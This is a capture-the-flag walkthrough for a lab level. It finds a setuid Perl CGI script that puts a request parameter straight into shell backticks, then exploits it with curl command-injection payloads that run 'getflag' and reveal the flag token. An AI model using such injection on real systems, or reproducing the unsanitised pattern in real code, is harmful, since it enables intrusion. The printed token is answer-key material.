# level04

## Steps

1. __Action__ (Guest): list the files present at the root
    ```sh
    ls -A
    ```

2. __Observation__ (Guest): the previous command reveals a Perl file
    ```sh
    .bash_logout  .bashrc  level04.pl  .profile
    ```

3. __Action__ (Guest): get more information on the file
    ```sh
    getfacl level04.pl
    ```

4. __Observation__ (Guest): the previous command reveals that the `level04.pl`
    file is a script, readable and executable by all, writable by the `level04`
    user and has the `setuid` and the `setgid` bits set.
    ```
    # file: level04.pl
    # owner: flag04
    # group: level04
    # flags: ss-
    user::rwx
    group::r-x
    other::r-x
    ```

5. __Action__ (Guest): run the script
    ```sh
    ./level04.pl
    ```

6. __Observation__ (Guest): nothing much happens, some text is displayed
    on stdout
    ```sh
    Content-type: text/html


    ```

7. __Action__ (Guest): check the content of the file
    ```sh
    cat level04.pl
    ```

8. __Observation__ (Guest): the previous command reveals the content 
    of the file
    ```perl
    #!/usr/bin/perl
    # localhost:4747
    use CGI qw{param};
    print "Content-type: text/html\n\n";
    sub x {
        $y = $_[0];
        print `echo $y 2>&1`;
    }
    x(param("x"));
    ```
    - The server is ran on localhost on the port 4747
    - The param is imported from the CGI module
    - The web server is informed the content sent back to the browser is HTML
    - There's a subroutine that takes the first argument given and prints it
    - The parameter passed is stored in a variable named `x`

9. __Action__ (Host): since the subroutine in `level04.pl` accepts a `x`
    variable, we pass the `getflag` comamnd to `x`.
    ```sh
    curl http://localhost:4747 -d 'x=`getflag`'
    ```
    It also works like this
    ```sh
    curl http://localhost:4747 -d 'x=$(getflag)'
    ```

10. __Observation__ (Host): the following sentence is displayed on the stdout
    ```sh
    Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
    ```
